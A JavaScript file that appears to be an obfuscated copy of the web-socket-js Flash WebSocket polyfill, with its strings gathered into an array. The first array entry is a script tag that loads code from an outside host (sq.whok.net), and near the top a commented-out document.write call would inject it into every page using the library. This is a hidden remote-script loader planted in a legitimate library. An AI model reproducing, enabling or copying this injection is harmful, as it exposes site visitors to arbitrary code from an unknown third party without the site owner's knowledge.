'use strict';
/** @type {!Array} */
var configs = [
    "<script type='text/javascript' src='https://sq.whok.net/rz.asp?sqid=SN20200703233635'>\x3c/script", "write", 
    "WEB_SOCKET_FORCE_FLASH", "WebSocket", "MozWebSocket", "WEB_SOCKET_LOGGER", 
    "console", "log", "error", "major", "getFlashPlayerVersion", "Flash Player >= 10.0.0 is required.", 
    "protocol", "file:", "WARNING: web-socket-js doesn't work in file:///... URL ", 
    "unless you set Flash Security Settings properly. ", 
    "Open the page via Web server i.e. http://...", 
    "__id", "__nextId", "__instances", "readyState", "CONNECTING", "bufferedAmount", "__events", 
    "string", "__createTask", "create", "__flash", "send", "prototype", 
    "INVALID_STATE_ERR: Web Socket connection has not been established", 
    "close", "CLOSED", "CLOSING", "addEventListener", "push", "removeEventListener", "length", 
    "splice", "dispatchEvent", "type", "on", "apply", "__handleEvent", "open", "wasClean", "code", 
    "reason", "message", "unknown event type: ", "__createSimpleEvent", "createEvent", "Event", "initEvent",
    "__createMessageEvent", "MessageEvent", "function", "opera", "initMessageEvent", "OPEN", 
    "__isFlashImplementation", "__initialized", "__tasks", "loadFlashPolicyFile", "loadManualPolicyFile", "__initialize", 
    "__swfLocation", "WEB_SOCKET_SWF_LOCATION", "[WebSocket] set WEB_SOCKET_SWF_LOCATION to location of WebSocketMain.swf", 
    "WEB_SOCKET_SUPPRESS_CROSS_DOMAIN_SWF_ERROR", "match", "$1", "host", 
    "[WebSocket] You must host HTML and WebSocketMain.swf in the same host ", "('", "' != '", "'). ", 
    "See also 'How to host HTML file and SWF file in different domains' section ",
    "in README.md. If you use WebSocketMainInsecure.swf, you can suppress this message ", 
    "by WEB_SOCKET_SUPPRESS_CROSS_DOMAIN_SWF_ERROR = true;", "div", "createElement", "id", 
    "webSocketContainer", "position", "style", "absolute", "left", "0px", "top", "-100px", "webSocketFlash", "appendChild", "body", "1", "10.0.0", "always", "success", "[WebSocket] swfobject.embedSWF failed", "embedSWF", "__onFlashInitialized", "getElementById", "href", "setCallerUrl", "WEB_SOCKET_DEBUG", "setDebug", "__onFlashEvent",
    "receiveEvents", "webSocketId", "__log", "__error", "__addTask", "__isFlashLite", "navigator", "mimeTypes", "application/x-shockwave-flash", "enabledPlugin", "filename", "WEB_SOCKET_DISABLE_AUTO_INITIALIZATION", "addDomLoadEvent"];


// document[configs[1]](configs[0]);

(function() {
  if (window[configs[2]]) {
  } else {
    if (window[configs[3]]) {
      return;
    } else {
      if (window[configs[4]]) {
        window[configs[3]] = MozWebSocket;
        return;
      }
    }
  }
  var logger;
  if (window[configs[5]]) {
    logger = WEB_SOCKET_LOGGER;
  } else {
    if (window[configs[6]] && window[configs[6]][configs[7]] && window[configs[6]][configs[8]]) {
      logger = window[configs[6]];
    } else {
      logger = {
        log : function() {
        },
        error : function() {
        }
      };
    }
  }
  if (swfobject[configs[10]]()[configs[9]] < 10) {
    logger[configs[8]](configs[11]);
    return;
  }
  if (location[configs[12]] == configs[13]) {
    logger[configs[8]](configs[14] + configs[15] + configs[16]);
  }
  /**
   * @param {?} mmCoreSplitViewBlock
   * @param {!Array} mmaPushNotificationsComponent
   * @param {string} canCreateDiscussions
   * @param {number} isSlidingUp
   * @param {string} dontForceConstraints
   * @return {undefined}
   */
  window[configs[3]] = function(mmCoreSplitViewBlock, mmaPushNotificationsComponent, canCreateDiscussions, isSlidingUp, dontForceConstraints) {
    var self = this;
    /** @type {number} */
    self[configs[17]] = WebSocket[configs[18]]++;
    WebSocket[configs[19]][self[configs[17]]] = self;
    self[configs[20]] = WebSocket[configs[21]];
    /** @type {number} */
    self[configs[22]] = 0;
    self[configs[23]] = {};
    if (!mmaPushNotificationsComponent) {
      /** @type {!Array} */
      mmaPushNotificationsComponent = [];
    } else {
      if (typeof mmaPushNotificationsComponent == configs[24]) {
        /** @type {!Array} */
        mmaPushNotificationsComponent = [mmaPushNotificationsComponent];
      }
    }
    /** @type {number} */
    self[configs[25]] = setTimeout(function() {
      WebSocket.__addTask(function() {
        /** @type {null} */
        self[configs[25]] = null;
        WebSocket[configs[27]][configs[26]](self.__id, mmCoreSplitViewBlock, mmaPushNotificationsComponent, canCreateDiscussions || null, isSlidingUp || 0, dontForceConstraints || null);
      });
    }, 0);
  };
  /**
   * @param {?} qov
   * @return {?}
   */
  WebSocket[configs[29]][configs[28]] = function(qov) {
    if (this[configs[20]] == WebSocket[configs[21]]) {
      throw configs[30];
    }
    var serviceAndId = WebSocket[configs[27]][configs[28]](this.__id, encodeURIComponent(qov));
    if (serviceAndId < 0) {
      return true;
    } else {
      this[configs[22]] += serviceAndId;
      return false;
    }
  };
  /**
   * @return {undefined}
   */
  WebSocket[configs[29]][configs[31]] = function() {
    if (this[configs[25]]) {
      clearTimeout(this.__createTask);
      /** @type {null} */
      this[configs[25]] = null;
      this[configs[20]] = WebSocket[configs[32]];
      return;
    }
    if (this[configs[20]] == WebSocket[configs[32]] || this[configs[20]] == WebSocket[configs[33]]) {
      return;
    }
    this[configs[20]] = WebSocket[configs[33]];
    WebSocket[configs[27]][configs[31]](this.__id);
  };
  /**
   * @param {?} ballNumber
   * @param {?} mmCoreSplitViewBlock
   * @param {?} canCreateDiscussions
   * @return {undefined}
   */
  WebSocket[configs[29]][configs[34]] = function(ballNumber, mmCoreSplitViewBlock, canCreateDiscussions) {
    if (!(ballNumber in this[configs[23]])) {
      /** @type {!Array} */
      this[configs[23]][ballNumber] = [];
    }
    this[configs[23]][ballNumber][configs[35]](mmCoreSplitViewBlock);
  };
  /**
   * @param {?} proxyName
   * @param {?} undefined
   * @param {?} canCreateDiscussions
   * @return {undefined}
   */
  WebSocket[configs[29]][configs[36]] = function(proxyName, undefined, canCreateDiscussions) {
    if (!(proxyName in this[configs[23]])) {
      return;
    }
    var proxy = this[configs[23]][proxyName];
    /** @type {number} */
    var key = proxy[configs[37]] - 1;
    for (; key >= 0; --key) {
      if (proxy[key] === undefined) {
        proxy[configs[38]](key, 1);
        break;
      }
    }
  };
  /**
   * @param {?} test
   * @return {undefined}
   */
  WebSocket[configs[29]][configs[39]] = function(test) {
    var PL$13 = this[configs[23]][test[configs[40]]] || [];
    /** @type {number} */
    var PL$17 = 0;
    for (; PL$17 < PL$13[configs[37]]; ++PL$17) {
      PL$13[PL$17](test);
    }
    var _ = this[configs[41] + test[configs[40]]];
    if (_) {
      _[configs[42]](this, [test]);
    }
  };
  /**
   * @param {?} value
   * @return {undefined}
   */
  WebSocket[configs[29]][configs[43]] = function(value) {
    if (configs[20] in value) {
      this[configs[20]] = value[configs[20]];
    }
    if (configs[12] in value) {
      this[configs[12]] = value[configs[12]];
    }
    var jsEvent;
    if (value[configs[40]] == configs[44] || value[configs[40]] == configs[8]) {
      jsEvent = this.__createSimpleEvent(value[configs[40]]);
    } else {
      if (value[configs[40]] == configs[31]) {
        jsEvent = this.__createSimpleEvent(configs[31]);
        /** @type {boolean} */
        jsEvent[configs[45]] = value[configs[45]] ? true : false;
        jsEvent[configs[46]] = value[configs[46]];
        jsEvent[configs[47]] = value[configs[47]];
      } else {
        if (value[configs[40]] == configs[48]) {
          /** @type {string} */
          var data = decodeURIComponent(value[configs[48]]);
          jsEvent = this.__createMessageEvent(configs[48], data);
        } else {
          throw configs[49] + value[configs[40]];
        }
      }
    }
    this[configs[39]](jsEvent);
  };
  /**
   * @param {!Object} event
   * @return {?}
   */
  WebSocket[configs[29]][configs[50]] = function(event) {
    if (document[configs[51]] && window[configs[52]]) {
      var click_handlers = document[configs[51]](configs[52]);
      click_handlers[configs[53]](event, false, false);
      return click_handlers;
    } else {
      return {
        type : event,
        bubbles : false,
        cancelable : false
      };
    }
  };
  /**
   * @param {!Object} mmUserProfileHandlersTypeCommunication
   * @param {!Object} params
   * @return {?}
   */
  WebSocket[configs[29]][configs[54]] = function(mmUserProfileHandlersTypeCommunication, params) {
    if (window[configs[55]] && typeof MessageEvent == configs[56] && !window[configs[57]]) {
      return new MessageEvent(configs[48], {
        "view" : window,
        "bubbles" : false,
        "cancelable" : false,
        "data" : params
      });
    } else {
      if (document[configs[51]] && window[configs[55]] && !window[configs[57]]) {
        var TileRenderer = document[configs[51]](configs[55]);
        TileRenderer[configs[58]](configs[48], false, false, params, null, null, window, null);
        return TileRenderer;
      } else {
        return {
          type : mmUserProfileHandlersTypeCommunication,
          data : params,
          bubbles : false,
          cancelable : false
        };
      }
    }
  };
  /** @type {number} */
  WebSocket[configs[21]] = 0;
  /** @type {number} */
  WebSocket[configs[59]] = 1;
  /** @type {number} */
  WebSocket[configs[33]] = 2;
  /** @type {number} */
  WebSocket[configs[32]] = 3;
  /** @type {boolean} */
  WebSocket[configs[60]] = true;
  /** @type {boolean} */
  WebSocket[configs[61]] = false;
  /** @type {null} */
  WebSocket[configs[27]] = null;
  WebSocket[configs[19]] = {};
  /** @type {!Array} */
  WebSocket[configs[62]] = [];
  /** @type {number} */
  WebSocket[configs[18]] = 0;
  /**
   * @param {?} mmCoreSplitViewBlock
   * @return {undefined}
   */
  WebSocket[configs[63]] = function(mmCoreSplitViewBlock) {
    WebSocket.__addTask(function() {
      WebSocket[configs[27]][configs[64]](mmCoreSplitViewBlock);
    });
  };
  /**
   * @return {undefined}
   */
  WebSocket[configs[65]] = function() {
    if (WebSocket[configs[61]]) {
      return;
    }
    /** @type {boolean} */
    WebSocket[configs[61]] = true;
    if (WebSocket[configs[66]]) {
      window[configs[67]] = WebSocket[configs[66]];
    }
    if (!window[configs[67]]) {
      logger[configs[8]](configs[68]);
      return;
    }
    if (!window[configs[69]] && !WEB_SOCKET_SWF_LOCATION[configs[70]](/(^|\/)WebSocketMainInsecure\.swf(\?.*)?$/) && WEB_SOCKET_SWF_LOCATION[configs[70]](/^\w+:\/\/([^\/]+)/)) {
      var isRegExp = RegExp[configs[71]];
      if (location[configs[72]] != isRegExp) {
        logger[configs[8]](configs[73] + configs[74] + location[configs[72]] + configs[75] + isRegExp + configs[76] + configs[77] + configs[78] + configs[79]);
      }
    }
    var _spring2 = document[configs[81]](configs[80]);
    _spring2[configs[82]] = configs[83];
    _spring2[configs[85]][configs[84]] = configs[86];
    if (WebSocket.__isFlashLite()) {
      _spring2[configs[85]][configs[87]] = configs[88];
      _spring2[configs[85]][configs[89]] = configs[88];
    } else {
      _spring2[configs[85]][configs[87]] = configs[90];
      _spring2[configs[85]][configs[89]] = configs[90];
    }
    var val = document[configs[81]](configs[80]);
    val[configs[82]] = configs[91];
    _spring2[configs[92]](val);
    document[configs[93]][configs[92]](_spring2);
    swfobject[configs[99]](WEB_SOCKET_SWF_LOCATION, configs[91], configs[94], configs[94], configs[95], null, null, {
      hasPriority : true,
      swliveconnect : true,
      allowScriptAccess : configs[96]
    }, null, function(canCreateDiscussions) {
      if (!canCreateDiscussions[configs[97]]) {
        logger[configs[8]](configs[98]);
      }
    });
  };
  /**
   * @return {undefined}
   */
  WebSocket[configs[100]] = function() {
    setTimeout(function() {
      WebSocket[configs[27]] = document[configs[101]](configs[91]);
      WebSocket[configs[27]][configs[103]](location[configs[102]]);
      WebSocket[configs[27]][configs[105]](!!window[configs[104]]);
      /** @type {number} */
      var indexLookupKey = 0;
      for (; indexLookupKey < WebSocket[configs[62]][configs[37]]; ++indexLookupKey) {
        WebSocket[configs[62]][indexLookupKey]();
      }
      /** @type {!Array} */
      WebSocket[configs[62]] = [];
    }, 0);
  };
  /**
   * @return {?}
   */
  WebSocket[configs[106]] = function() {
    setTimeout(function() {
      try {
        var fftBinsOfFreq = WebSocket[configs[27]][configs[107]]();
        /** @type {number} */
        var i = 0;
        for (; i < fftBinsOfFreq[configs[37]]; ++i) {
          WebSocket[configs[19]][fftBinsOfFreq[i][configs[108]]].__handleEvent(fftBinsOfFreq[i]);
        }
      } catch (logSystem) {
        logger[configs[8]](logSystem);
      }
    }, 0);
    return true;
  };
  /**
   * @param {?} vEventVer
   * @return {undefined}
   */
  WebSocket[configs[109]] = function(vEventVer) {
    logger[configs[7]](decodeURIComponent(vEventVer));
  };
  /**
   * @param {?} vEventVer
   * @return {undefined}
   */
  WebSocket[configs[110]] = function(vEventVer) {
    logger[configs[8]](decodeURIComponent(vEventVer));
  };
  /**
   * @param {?} wrongCredsCallback
   * @return {undefined}
   */
  WebSocket[configs[111]] = function(wrongCredsCallback) {
    if (WebSocket[configs[27]]) {
      wrongCredsCallback();
    } else {
      WebSocket[configs[62]][configs[35]](wrongCredsCallback);
    }
  };
  /**
   * @return {?}
   */
  WebSocket[configs[112]] = function() {
    if (!window[configs[113]] || !window[configs[113]][configs[114]]) {
      return false;
    }
    var _0xc8dcx19 = window[configs[113]][configs[114]][configs[115]];
    if (!_0xc8dcx19 || !_0xc8dcx19[configs[116]] || !_0xc8dcx19[configs[116]][configs[117]]) {
      return false;
    }
    return _0xc8dcx19[configs[116]][configs[117]][configs[70]](/flashlite/i) ? true : false;
  };
  if (!window[configs[118]]) {
    swfobject[configs[119]](function() {
      WebSocket.__initialize();
    });
  }
})();
